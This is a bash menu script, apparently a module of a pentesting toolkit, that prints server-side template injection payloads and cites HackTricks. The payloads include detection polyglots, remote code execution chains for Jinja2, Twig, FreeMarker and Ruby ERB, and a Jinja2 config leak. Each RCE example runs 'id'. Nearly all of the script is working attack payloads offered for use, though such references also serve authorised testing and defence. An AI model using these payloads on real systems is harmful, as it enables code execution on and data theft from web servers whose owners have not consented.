#!/bin/bash
# HackTricks Ref: ssti
# Module: Server-Side Template Injection (SSTI)

echo -e "${C6}[WEB ATTACK: SERVER_SSTI]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
echo -e "--------------------------------------------------"

echo -e "${C4}Select SSTI Vector/Engine:${NC}"
echo "1) Detection (The Universal Polyglot)"
echo "2) Python: Jinja2 / Mako"
echo "3) PHP: Twig / Smarty"
echo "4) Java: FreeMarker / Velocity"
echo "5) Ruby: ERB / Slim"
echo "0) Exit"

read -p "Selection: " ssti_opt

case $ssti_opt in
    1)
        echo -e "\n${C2}[*] Universal Detection Payloads:${NC}"
        echo "Inject and look for '49' or error messages:"
        echo " - {{7*7}}"
        echo " - \${7*7}"
        echo " - <%= 7*7 %>"
        echo " - \${{7*7}}"
        echo " - #{7*7}"
        ;;
    2)
        echo -e "\n${C2}[*] Python (Jinja2) RCE:${NC}"
        echo "Standard RCE via __globals__:"
        echo " {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
        echo -e "${C5}Config Leak:${NC} {{ config.items() }}"
        ;;
    3)
        echo -e "\n${C2}[*] PHP (Twig) RCE:${NC}"
        echo "Using the filter callback technique:"
        echo " {{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}"
        ;;
    4)
        echo -e "\n${C2}[*] Java (FreeMarker) RCE:${NC}"
        echo "Using the 'Execute' utility:"
        echo ' <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }'
        ;;
    5)
        echo -e "\n${C2}[*] Ruby (ERB) RCE:${NC}"
        echo " <%= \`id\` %>"
        echo " <%= IO.popen('id').read %>"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
